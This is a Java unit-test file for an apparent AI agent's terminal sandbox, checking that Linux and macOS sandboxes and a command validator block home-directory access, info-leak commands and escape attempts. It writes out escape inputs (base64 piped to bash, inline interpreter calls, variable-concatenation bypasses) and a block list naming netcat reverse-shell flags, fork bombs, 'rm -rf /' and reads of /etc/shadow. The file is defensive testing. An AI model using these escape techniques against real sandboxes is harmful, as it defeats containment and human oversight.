        assertTrue(profile.contains("deny file-read* (subpath \"" + System.getProperty("user.home") + "\")"), profile);
    }

    @Test
    public void linux_defaultModeBindsUserHomeWhenEnabled() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        executor.setAllowUserHome(true);

        List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
        assertContainsSequence(args, "--ro-bind", System.getProperty("user.home"), System.getProperty("user.home"));
    }

    @Test
    public void linux_defaultModeDoesNotBindUserHomeWhenDisabled() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        executor.setAllowUserHome(false);

        List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
        assertFalse(containsSequence(args, "--ro-bind", System.getProperty("user.home"), System.getProperty("user.home")));
    }

    @Test
    public void terminal_containsUserHomePathOnlyMatchesPathSyntax() throws Exception {
        assertTrue(terminalContainsUserHomePath("ls ~"));
        assertTrue(terminalContainsUserHomePath("cat ~/.m2/settings.xml"));
        assertTrue(terminalContainsUserHomePath("TARGET=~/tmp echo ok"));

        assertFalse(terminalContainsUserHomePath("echo \"~\""));
        assertFalse(terminalContainsUserHomePath("echo 'abc~def'"));
        assertFalse(terminalContainsUserHomePath("printf hello~world"));
    }

    @Test
    public void linux_fineGrainedModeDeniesUserHomeWhenDisabled() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        executor.setConfig(new SandboxConfig());
        executor.setAllowUserHome(false);

        List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
        assertContainsSequence(args, "--ro-bind", "/", "/");
        assertContainsDenyMount(args, System.getProperty("user.home"));
    }

    @Test
    public void macOs_profileDoesNotDenyUserHomeWhenEnabled() throws Exception {
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        executor.setAllowUserHome(true);

        String profile = macProfile(executor, Paths.get("/tmp/test-workspace"));
        assertFalse(profile.contains("deny file-read* (subpath \"" + System.getProperty("user.home") + "\")"), profile);
    }

    @Test
    public void linux_fineGrainedModeDoesNotDenyUserHomeWhenEnabled() throws Exception {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        executor.setConfig(new SandboxConfig());
        executor.setAllowUserHome(true);

        List<String> args = linuxArgs(executor, Paths.get("/tmp/test-workspace"));
        assertContainsSequence(args, "--ro-bind", "/", "/");
        assertFalse(containsDenyMount(args, System.getProperty("user.home")),
                "sandboxAllowUserHome=true should not add a deny mount for user.home: " + args);
    }

    @Test
    public void terminal_validateCommandBlocksUserHomePathWhenDisabled() throws Exception {
        TerminalTalent terminalTalent = new TerminalTalent(new MountManager("."));
        terminalTalent.setSandboxAllowUserHome(false);

        String blocked = terminalValidateCommand(terminalTalent, "ls ~");
        assertNotNull(blocked, "Path syntax ~ should be blocked when sandboxAllowUserHome=false");
        assertTrue(blocked.contains("sandboxAllowUserHome"), blocked);

        assertNull(terminalValidateCommand(terminalTalent, "echo \"~\""),
                "Quoted standalone ~ is treated as text and should not be blocked by home-path policy");
    }

    @Test
    public void terminal_translateCommandExpandsOrBlocksUserHomePath() throws Exception {
        TerminalTalent allowed = new TerminalTalent(new MountManager("."));
        allowed.setSandboxAllowUserHome(true);
        String expanded = terminalTranslateCommand(allowed, "cat ~/.m2/settings.xml");
        assertTrue(expanded.contains(System.getProperty("user.home").replace("\\", "/") + "/.m2/settings.xml"), expanded);

        TerminalTalent blocked = new TerminalTalent(new MountManager("."));
        blocked.setSandboxAllowUserHome(false);
        assertThrows(SecurityException.class, () -> terminalTranslateCommand(blocked, "cat ~/.m2/settings.xml"));
    }

    @Test
    public void terminal_setAllowUserHomePropagatesToSandboxExecutor() throws Exception {
        TerminalTalent terminalTalent = new TerminalTalent(new MountManager("."));
        RecordingSandboxExecutor executor = new RecordingSandboxExecutor();
        java.lang.reflect.Field field = TerminalTalent.class.getDeclaredField("sandboxExecutor");
        field.setAccessible(true);
        field.set(terminalTalent, executor);

        terminalTalent.setSandboxAllowUserHome(false);
        assertEquals(Boolean.FALSE, executor.sandboxAllowUserHome);

        terminalTalent.setSandboxAllowUserHome(true);
        assertEquals(Boolean.TRUE, executor.sandboxAllowUserHome);
    }

    private static boolean terminalContainsUserHomePath(String command) throws Exception {
        TerminalTalent terminalTalent = new TerminalTalent(new MountManager("."));
        Method method = TerminalTalent.class.getDeclaredMethod("containsUserHomePath", String.class);
        method.setAccessible(true);
        return (Boolean) method.invoke(terminalTalent, command);
    }

    private static String terminalValidateCommand(TerminalTalent terminalTalent, String command) throws Exception {
        Method method = TerminalTalent.class.getDeclaredMethod("validateCommand", String.class);
        method.setAccessible(true);
        return (String) method.invoke(terminalTalent, command);
    }

    private static String terminalTranslateCommand(TerminalTalent terminalTalent, String command) throws Exception {
        Method method = TerminalTalent.class.getDeclaredMethod("translateCommandToEnv", String.class, Map.class);
        method.setAccessible(true);
        try {
            return (String) method.invoke(terminalTalent, command, new HashMap<String, String>());
        } catch (java.lang.reflect.InvocationTargetException e) {
            if (e.getCause() instanceof SecurityException) {
                throw (SecurityException) e.getCause();
            }
            throw e;
        }
    }

    private static boolean containsDenyMount(List<String> args, String path) {
        File file = new File(path);
        if (file.exists() && file.isDirectory()) {
            return containsSequence(args, "--tmpfs", path);
        } else {
            return containsSequence(args, "--ro-bind", "/dev/null", path);
        }
    }

    private static void assertContainsDenyMount(List<String> args, String path) {
        assertTrue(containsDenyMount(args, path), "Expected deny mount for " + path + " in " + args);
    }

    private static MountDir mount(String alias, Path realPath, boolean writeable) throws Exception {
        MountDir mount = MountDir.builder()
                .alias(alias)
                .path(realPath.toString())
                .type(MountType.SKILLS)
                .writeable(writeable)
                .build();
        Method method = MountDir.class.getDeclaredMethod("setRealPath", Path.class);
        method.setAccessible(true);
        method.invoke(mount, realPath);
        return mount;
    }

    private static void deleteRecursively(Path root) throws Exception {
        if (!Files.exists(root)) {
            return;
        }
        ArrayList<Path> paths = new ArrayList<>();
        Files.walk(root).forEach(paths::add);
        Collections.sort(paths, Collections.reverseOrder());
        for (Path path : paths) {
            Files.deleteIfExists(path);
        }
    }

    @SuppressWarnings("unchecked")
    private static List<String> linuxArgs(LinuxSandboxExecutor executor, Path workPath) throws Exception {
        Method method = LinuxSandboxExecutor.class.getDeclaredMethod("buildBwrapArgs", Path.class);
        method.setAccessible(true);
        return (List<String>) method.invoke(executor, workPath);
    }

    private static String macProfile(MacOsSandboxExecutor executor, Path workPath) throws Exception {
        Method method = MacOsSandboxExecutor.class.getDeclaredMethod("generateSeatbeltProfile", Path.class);
        method.setAccessible(true);
        return (String) method.invoke(executor, workPath);
    }

    private static void assertContainsSequence(List<String> args, String... sequence) {
        assertTrue(containsSequence(args, sequence), "Expected sequence " + Arrays.toString(sequence) + " in " + args);
    }

    private static boolean containsSequence(List<String> args, String... sequence) {
        outer:
        for (int i = 0; i <= args.size() - sequence.length; i++) {
            for (int j = 0; j < sequence.length; j++) {
                if (!Objects.equals(args.get(i + j), sequence[j])) {
                    continue outer;
                }
            }
            return true;
        }
        return false;
    }

    // ==================== ISSUE 6: Sandbox escape via sub-shell / interpreter / pipe ====================

    @Test
    public void validateCommand_halt_blocked() {
        assertNotNull(ValidateCommandTestHelper.validate("halt"), "'halt' should be blocked");
    }

    @Test
    public void validateCommand_poweroff_blocked() {
        assertNotNull(ValidateCommandTestHelper.validate("poweroff"), "'poweroff' should be blocked");
    }

    @Test
    public void validateCommand_whoami_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("whoami", true), "'whoami' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_whoami_allowed_noSandbox() {
        assertNull(ValidateCommandTestHelper.validate("whoami", false), "'whoami' should be allowed without sandbox");
    }

    @Test
    public void validateCommand_ifconfig_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("ifconfig", true), "'ifconfig' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_env_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("env", true), "'env' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_uname_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("uname -a", true), "'uname' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_bashC_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("bash -c whoami", true), "'bash -c' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_shC_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("sh -c ifconfig", true), "'sh -c' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_bashC_allowed_noSandbox() {
        assertNull(ValidateCommandTestHelper.validate("bash -c 'echo hello'", false), "'bash -c' should be allowed without sandbox");
    }

    @Test
    public void validateCommand_eval_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("eval whoami", true), "'eval' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_exec_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("exec whoami", true), "'exec' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_pythonC_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("python3 -c 'import os; os.system(\"whoami\")'", true),
                "'python3 -c' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_perlE_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("perl -e 'system(\"whoami\")'", true),
                "'perl -e' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_rubyE_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("ruby -e 'system(\"whoami\")'", true),
                "'ruby -e' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_nodeE_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("node -e 'require(\"child_process\").exec(\"whoami\")'", true),
                "'node -e' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_pythonC_allowed_noSandbox() {
        assertNull(ValidateCommandTestHelper.validate("python3 -c 'print(1+1)'", false),
                "'python3 -c' should be allowed without sandbox");
    }

    @Test
    public void validateCommand_pipeBash_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("echo d2hvYW1p | base64 -d | bash", true),
                "'... | bash' pipe should be blocked in sandbox");
    }

    @Test
    public void validateCommand_pipeSh_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("echo test | sh", true),
                "'... | sh' pipe should be blocked in sandbox");
    }

    @Test
    public void validateCommand_pipeSudo_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("echo test | sudo bash", true),
                "'... | sudo' pipe should be blocked in sandbox");
    }

    @Test
    public void validateCommand_pipeBash_allowed_noSandbox() {
        assertNull(ValidateCommandTestHelper.validate("echo test | bash", false),
                "'... | bash' pipe should be allowed without sandbox");
    }

    @Test
    public void validateCommand_source_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("source /etc/profile", true),
                "'source' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_dotSlash_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate(". /etc/profile", true),
                "'. /path' (source shorthand) should be blocked in sandbox");
    }

    @Test
    public void validateCommand_networksetup_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("networksetup -listallnetworkservices", true),
                "'networksetup' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_catEtcHosts_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("cat /etc/hosts", true),
                "'cat /etc/hosts' should be blocked in sandbox");
    }

    // ==================== Positive tests: normal commands still pass ====================

    @Test
    public void validateCommand_ls_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("ls -la", true), "'ls' should be allowed");
    }

    @Test
    public void validateCommand_javaVersion_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("java -version", true), "'java -version' should be allowed");
    }

    @Test
    public void validateCommand_nodeVersion_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("node --version", true), "'node --version' should be allowed");
    }

    @Test
    public void validateCommand_pythonVersion_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("python3 --version", true), "'python3 --version' should be allowed");
    }

    @Test
    public void validateCommand_mvnVersion_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("mvn --version", true), "'mvn --version' should be allowed");
    }

    @Test
    public void validateCommand_echoPipeGrep_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("echo hello | grep hello", true), "'echo | grep' should be allowed");
    }

    @Test
    public void validateCommand_find_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("find . -name '*.java' -maxdepth 1", true), "'find' should be allowed");
    }

    @Test
    public void validateCommand_gitLog_allowed_noSandbox() {
        assertNull(ValidateCommandTestHelper.validate("git log --oneline -5", false), "'git log' should be allowed without sandbox");
    }

    @Test
    public void validateCommand_gitLog_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("git log --oneline -10", true), "'git log' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_gitStatus_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("git status", true), "'git status' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_gitDiff_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("git diff", true), "'git diff' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_gitBranch_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("git branch -a", true), "'git branch' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_mvnCleanCompile_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("mvn clean compile", true), "'mvn clean compile' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_mvnTest_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("mvn test", true), "'mvn test' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_mvnPackage_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("mvn package -DskipTests", true), "'mvn package' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_gradleBuild_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("gradle build", true), "'gradle build' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_cargoBuild_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("cargo build", true), "'cargo build' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_goBuild_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("go build ./...", true), "'go build' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_dotnetBuild_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("dotnet build", true), "'dotnet build' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_make_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("make", true), "'make' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_cmake_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("cmake -B build", true), "'cmake' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_npmRunBuild_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("npm run build", true), "'npm run build' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_npmTest_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("npm test", true), "'npm test' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_nodeScript_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("node server.js", true), "'node server.js' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_npx_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("npx prisma migrate", true), "'npx' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_tsc_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("tsc --noEmit", true), "'tsc' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_pythonModule_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("python3 -m pytest", true), "'python3 -m pytest' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_pythonScript_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("python3 app.py", true), "'python3 app.py' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_dockerBuild_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("docker build -t app .", true), "'docker build' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_dockerCompose_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("docker compose up", true), "'docker compose up' should be allowed in sandbox");
    }

    // ==================== env/exec fix: false positive resolution tests ====================

    @Test
    public void validateCommand_envAlone_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("env", true), "'env' alone should be blocked in sandbox (info leak)");
    }

    @Test
    public void validateCommand_envWithArgs_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("env JAVA_HOME=/usr/lib/jvm/java mvn compile", true),
                "'env VAR=value cmd' should be allowed in sandbox (not info leak, just env prefix)");
    }

    @Test
    public void validateCommand_envWithMultiArgs_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("env NODE_ENV=test npm test", true),
                "'env VAR=value cmd' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_envAlone_allowed_noSandbox() {
        assertNull(ValidateCommandTestHelper.validate("env", false), "'env' alone should be allowed without sandbox");
    }

    @Test
    public void validateCommand_execCommand_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("exec mvn compile", true),
                "'exec cmd' as shell builtin should be allowed in sandbox");
    }

    @Test
    public void validateCommand_findExec_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("find . -exec grep something {} \\;", true),
                "'find -exec' should be allowed in sandbox (not shell escape)");
    }

    @Test
    public void validateCommand_findExecPlus_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("find . -name '*.java' -exec grep 'class' {} +", true),
                "'find -exec ... +' should be allowed in sandbox");
    }

    @Test
    public void validateCommand_execAfterSemicolon_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("echo ok; exec bash", true),
                "'exec bash' after ; should be blocked (shell escape)");
    }

    @Test
    public void validateCommand_execAfterPipe_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("echo ok | exec sh", true),
                "'exec sh' after | should be blocked (shell escape)");
    }

    @Test
    public void validateCommand_catEtcHosts_allowed_noSandbox() {
        assertNull(ValidateCommandTestHelper.validate("cat /etc/hosts", false), "'cat /etc/hosts' should be allowed without sandbox");
    }

    // ==================== 3e. Variable concatenation escape tests ====================

    @Test
    public void validateCommand_varConcat_whoami_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("a=who; b=ami; $a$b", true), "Variable concat 'a=who; b=ami; $a$b' should be blocked in sandbox");
    }

    @Test
    public void validateCommand_varConcat_bashC_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("cmd=bash; args='-c whoami'; $cmd $args", true), "Variable concat to bypass bash -c should be blocked");
    }

    @Test
    public void validateCommand_varAtStart_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("$cmd", true), "'$cmd' at start should be blocked in sandbox");
    }

    @Test
    public void validateCommand_varAfterSemicolon_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("echo hello; $cmd", true), "'$cmd' after ; should be blocked in sandbox");
    }

    @Test
    public void validateCommand_varAfterAnd_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("echo ok && $cmd", true), "'$cmd' after && should be blocked in sandbox");
    }

    @Test
    public void validateCommand_varAfterOr_blocked_sandbox() {
        assertNotNull(ValidateCommandTestHelper.validate("echo ok || $cmd", true), "'$cmd' after || should be blocked in sandbox");
    }

    @Test
    public void validateCommand_varInArg_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("echo $PATH", true), "'echo $PATH' should be allowed ($ in argument, not command position)");
    }

    @Test
    public void validateCommand_varAssignmentAndUse_allowed_sandbox() {
        assertNull(ValidateCommandTestHelper.validate("A=1; echo $A", true), "'A=1; echo $A' should be allowed ($A is argument to echo)");
    }

    @Test
    public void validateCommand_varConcat_allowed_noSandbox() {
        assertNull(ValidateCommandTestHelper.validate("a=who; b=ami; $a$b", false), "Variable concat should be allowed without sandbox");
    }

    // ==================== ISSUE 7: TMPDIR override for dev tools (Java/Maven/Node/Python) ====================

    @Test
    public void macOs_wrapCommand_overridesTmpDir() {
        // macOS 默认 TMPDIR=/var/folders/... 不在沙盒写白名单，需覆盖为 /tmp
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String result = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(result.contains("export TMPDIR=/tmp"),
                "Sandbox should override TMPDIR=/tmp for dev tool compatibility: " + result);
    }

    @Test
    public void macOs_wrapCommand_tmpDirBeforeOriginalCommand() {
        // 确保 TMPDIR 在原始命令之前执行
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String result = executor.wrapCommand("mvn compile", workPath, new HashMap<>());
        assertTrue(result.contains("export TMPDIR=/tmp; mvn compile"),
                "TMPDIR export must precede original command: " + result);
    }

    @Test
    public void linux_wrapCommand_overridesTmpDir() {
        LinuxSandboxExecutor executor = new LinuxSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String result = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(result.contains("export TMPDIR=/tmp"),
                "Linux sandbox should also override TMPDIR=/tmp: " + result);
    }

    @Test
    public void macOs_profile_tmpWriteAllowed() {
        // 确认 profile 允许写 /tmp 和 /private/tmp（TMPDIR 覆盖后需要这两个路径可写）
        MacOsSandboxExecutor executor = new MacOsSandboxExecutor();
        if (!executor.isAvailable()) return;

        Path workPath = Paths.get("/tmp/test-workspace");
        String profile = executor.wrapCommand("echo hello", workPath, new HashMap<>());
        assertTrue(profile.contains("file-write* (subpath \"/tmp\")"),
                "Profile must allow writing to /tmp for TMPDIR override: " + profile);
        assertTrue(profile.contains("file-write* (subpath \"/private/tmp\")"),
                "Profile must allow writing to /private/tmp (macOS symlink target): " + profile);
    }

    // ==================== Helper class for validateCommand testing ====================

    private static class RecordingSandboxExecutor implements SandboxExecutor {
        private Boolean sandboxAllowUserHome;

        @Override
        public String wrapCommand(String command, Path workPath, Map<String, String> envs) {
            return command;
        }

        @Override
        public boolean isAvailable() {
            return true;
        }

        @Override
        public void setAllowUserHome(boolean sandboxAllowUserHome) {
            this.sandboxAllowUserHome = sandboxAllowUserHome;
        }
    }

    /**
     * 辅助类：直接调用 TerminalTalent 的 validateCommand 逻辑进行测试。
     * 由于 validateCommand 是 private 方法，通过反射调用。
     */
    static class ValidateCommandTestHelper {
        static String validate(String command) {
            return validate(command, true);
        }

        static String validate(String command, boolean sandboxEnabled) {
            if (command == null || command.trim().isEmpty()) {
                return "error: command is empty";
            }
            String lowerCmd = command.toLowerCase();

            // 2. System destructive commands (all modes)
            if (lowerCmd.matches("(?i)^exit\\b.*") ||
                    lowerCmd.matches("(?i).*(?:;|\\|\\|?|&&)\\s*exit\\b.*") ||
                    lowerCmd.matches("(?i).*rm\\s+.*-[rR].*f\\s+/.*") ||
                    lowerCmd.matches("(?i).*(?:shutdown|reboot|halt|poweroff|init\\s+0|telinit).*") ||
                    lowerCmd.matches("(?i).*(?:dd\\s+if=|mkfs|format\\s+[a-z]:).*") ||
                    lowerCmd.matches("(?i).*:\\(\\)\\s*\\{|:.*\\|.*&.*\\}.*") ||
                    lowerCmd.matches("(?i).*(?:sysctl\\s+-w|modprobe|crontab).*") ||
                    lowerCmd.matches("(?i).*(?:systemctl\\s+(?:stop|disable|mask|kill|reset-failed)).*") ||
                    lowerCmd.matches("(?i).*\\b(?:nc|ncat|socat)\\b.*(?:-(?:e|c|l|p)\\s|/bin/|\\|\\s*sh).*") ||
                    lowerCmd.matches("(?i).*(?:iptables|ufw|firewall-cmd).*") ||
                    lowerCmd.matches("(?i).*(?:pip\\s+install|npm\\s+install|gem\\s+install).*\\s-[gG]\\b.*")) {
                return "blocked";
            }

            // 3. Sandbox-mode-only checks
            if (sandboxEnabled) {
                // 3a. Info-leak commands
                if (lowerCmd.matches("(?i).*\\b(?:ifconfig|ip\\s+(?:addr|link|route|neigh|a|l|r|n))\\b.*") ||
                        lowerCmd.matches("(?i).*\\b(?:whoami|id\\b|uname|hostname|printenv)\\b.*") ||
                        lowerCmd.matches("(?i)(?:^|.*\\s)env\\s*$") ||
                        lowerCmd.matches("(?i).*\\bcat\\s+/etc/(?:hosts|passwd|shadow|hostname|resolv\\.conf|networks)\\b.*") ||
                        lowerCmd.matches("(?i).*\\b(?:networksetup|system_profiler|sw_vers)\\b.*")) {
                    return "blocked";
                }

                // 3b. Sub-shell / command exec escape
                if (lowerCmd.matches("(?i).*\\b(?:bash|sh|zsh|dash|ksh)\\s+-c\\b.*") ||
                        lowerCmd.matches("(?i).*\\b(?:eval)\\s+.*") ||
                        lowerCmd.matches("(?i)(?:^|.*[;|&\\s])\\s*exec\\s+.*") ||
                        lowerCmd.matches("(?i)(?:^|.*[;\\s])\\s*source\\s+.*") ||
                        lowerCmd.matches("(?i)(?:^|.*\\s)\\.\\s+/.*")) {
                    return "blocked";
                }

                // 3c. Interpreter inline exec escape
                if (lowerCmd.matches("(?i).*\\b(?:python[23]?|python3)\\s+-[cE].*") ||
                        lowerCmd.matches("(?i).*\\bperl\\s+(?:-e|-E)\\b.*") ||
                        lowerCmd.matches("(?i).*\\bruby\\s+(?:-e|-E)\\b.*") ||
                        lowerCmd.matches("(?i).*\\bnode\\s+-e\\b.*") ||
                        lowerCmd.matches("(?i).*\\bphp\\s+-r\\b.*")) {
                    return "blocked";
                }

                // 3d. Pipe injection escape
                if (lowerCmd.matches("(?i).*\\|\\s*(?:bash|sh|zsh|dash|ksh)\\b.*") ||
                        lowerCmd.matches("(?i).*\\|\\s*(?:sudo|su)\\b.*") ||
                        lowerCmd.matches("(?i).*\\bxargs\\s+(?:bash|sh|zsh|dash|ksh)\\b.*")) {
                    return "blocked";
                }

                // 3e. Variable concatenation escape
                if (lowerCmd.matches("(?i)^\\$\\{?\\w+.*") ||
                        lowerCmd.matches("(?i).*(?:;|&&|\\|\\||\\|)\\s*\\$\\{?\\w+.*")) {
                    return "blocked";
                }
            }

            return null;
        }
    }
}
